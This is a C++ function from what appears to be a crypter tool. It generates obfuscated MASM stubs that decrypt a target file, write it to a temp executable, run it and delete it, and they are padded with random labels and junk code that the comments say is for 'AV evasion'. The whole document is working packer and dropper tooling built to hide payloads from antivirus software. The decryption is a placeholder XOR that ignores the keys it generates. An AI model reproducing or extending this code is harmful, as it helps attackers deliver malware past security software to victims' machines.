    // Advanced MASM Stub Generator (option 5)
    void generateMASMStub() {
        std::string targetFile;
        std::cout << "Enter target file path (file to decrypt at runtime): ";
        std::getline(std::cin, targetFile);

        // Check if target file exists
        std::ifstream testFile(targetFile);
        if (!testFile) {
            std::cout << "⚠️  Warning: Target file " << targetFile << " not found, but stub will be generated anyway." << std::endl;
        } else {
            testFile.close();
        }

        // Generate keys for the stub
        auto keys = generateKeys();

        // Convert keys to decimal for obfuscation
        std::string chachaKeyDecimal = bytesToBigDecimal(keys.chacha_key);
        std::string chachaNonceDecimal = bytesToBigDecimal(keys.chacha_nonce);
        std::string aesKeyDecimal = bytesToBigDecimal(keys.aes_key);
        std::string xorKeyDecimal = bytesToBigDecimal(keys.xor_key);

        // Generate unique labels and variable names for polymorphism
        std::string mainLabel = "main_" + std::to_string(rng() % 10000);
        std::string decryptLabel = "decrypt_" + std::to_string(rng() % 10000);
        std::string execLabel = "exec_" + std::to_string(rng() % 10000);
        std::string keyLabel = "key_" + std::to_string(rng() % 10000);
        std::string bufferLabel = "buffer_" + std::to_string(rng() % 10000);
        std::string sizeLabel = "size_" + std::to_string(rng() % 10000);

        // Generate junk data for polymorphism
        std::string junkData;
        for (int i = 0; i < 50 + (rng() % 100); i++) {
            junkData += std::to_string(rng() % 256) + ", ";
        }

        std::string masmCode = R"(; Ultra-Lightweight MASM Runtime PE Stub
; Generated by VS2022 Universal Encryptor
; Target: )" + targetFile + R"(

.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\msvcrt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.data
    )" + keyLabel + R"(_chacha db ")" + chachaKeyDecimal + R"(", 0
    )" + keyLabel + R"(_nonce db ")" + chachaNonceDecimal + R"(", 0
    )" + keyLabel + R"(_aes db ")" + aesKeyDecimal + R"(", 0
    )" + keyLabel + R"(_xor db ")" + xorKeyDecimal + R"(", 0
    target_file db ")" + targetFile + R"(", 0
    temp_file db "upx_temp.exe", 0
    error_msg db "Failed to process target file", 0
    success_msg db "Execution complete", 0
    order_val dd )" + std::to_string(keys.encryption_order) + R"(
    
    ; Polymorphic junk data for AV evasion
    junk_data db )" + junkData + R"( 0
    
    )" + bufferLabel + R"( dd ?
    )" + sizeLabel + R"( dd ?
    file_handle dd ?
    bytes_read dd ?
    process_info PROCESS_INFORMATION <>
    startup_info STARTUPINFOA <>

.code
)" + mainLabel + R"(:
    ; Junk instructions for polymorphism
    nop
    mov eax, 12345678h
    xor eax, eax
    push eax
    pop eax
    
    ; Read target file
    invoke CreateFileA, addr target_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    cmp eax, INVALID_HANDLE_VALUE
    je error_exit
    mov file_handle, eax
    
    ; Get file size
    invoke GetFileSize, file_handle, NULL
    mov )" + sizeLabel + R"(, eax
    
    ; Allocate memory
    invoke GlobalAlloc, GMEM_FIXED, )" + sizeLabel + R"(
    mov )" + bufferLabel + R"(, eax
    
    ; Read file content
    invoke ReadFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; More junk instructions
    mov ebx, 87654321h
    add ebx, 11111111h
    sub ebx, 11111111h
    
    call )" + decryptLabel + R"(
    call )" + execLabel + R"(
    
    invoke GlobalFree, )" + bufferLabel + R"(
    invoke ExitProcess, 0

)" + decryptLabel + R"(:
    ; Polymorphic decryption routine
    ; This is a simplified version - full implementation would include
    ; ChaCha20, AES stream cipher, and XOR algorithms
    
    mov esi, )" + bufferLabel + R"(
    mov ecx, )" + sizeLabel + R"(
    mov edx, 0
    
decrypt_loop_)" + std::to_string(rng() % 1000) + R"(:
    cmp ecx, 0
    je decrypt_done_)" + std::to_string(rng() % 1000) + R"(
    
    ; Simple XOR decryption (placeholder for full implementation)
    mov al, byte ptr [esi + edx]
    xor al, 55h  ; Simplified key
    mov byte ptr [esi + edx], al
    
    inc edx
    dec ecx
    jmp decrypt_loop_)" + std::to_string(rng() % 1000) + R"(
    
decrypt_done_)" + std::to_string(rng() % 1000) + R"(:
    ret

)" + execLabel + R"(:
    ; Write decrypted data to temp file
    invoke CreateFileA, addr temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    cmp eax, INVALID_HANDLE_VALUE
    je error_exit
    mov file_handle, eax
    
    invoke WriteFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; Execute the temp file
    mov startup_info.cb, sizeof STARTUPINFOA
    invoke CreateProcessA, addr temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, addr startup_info, addr process_info
    
    cmp eax, 0
    je error_exit
    
    invoke WaitForSingleObject, process_info.hProcess, INFINITE
    invoke CloseHandle, process_info.hProcess
    invoke CloseHandle, process_info.hThread
    
    ; Clean up temp file
    invoke DeleteFileA, addr temp_file
    ret

error_exit:
    invoke MessageBoxA, NULL, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end )" + mainLabel + R"(
)";

        // Save the MASM stub
        std::string outputFile = "runtime_stub_" + std::to_string(rng() % 10000) + ".asm";
        std::ofstream outFile(outputFile);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile << masmCode;
        outFile.close();

        std::cout << "✅ MASM Runtime Stub generated successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "🎯 Target file: " << targetFile << std::endl;
        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "📋 Assemble with: ml /c /coff " << outputFile << std::endl;
        std::cout << "📋 Link with: link /subsystem:windows " << outputFile.substr(0, outputFile.find('.')) << ".obj" << std::endl;
        std::cout << "⚠️  Note: This is a lightweight stub. Full decryption algorithms need manual implementation." << std::endl;
        
        // Auto-compile the generated MASM file
        autoCompile(outputFile);
    }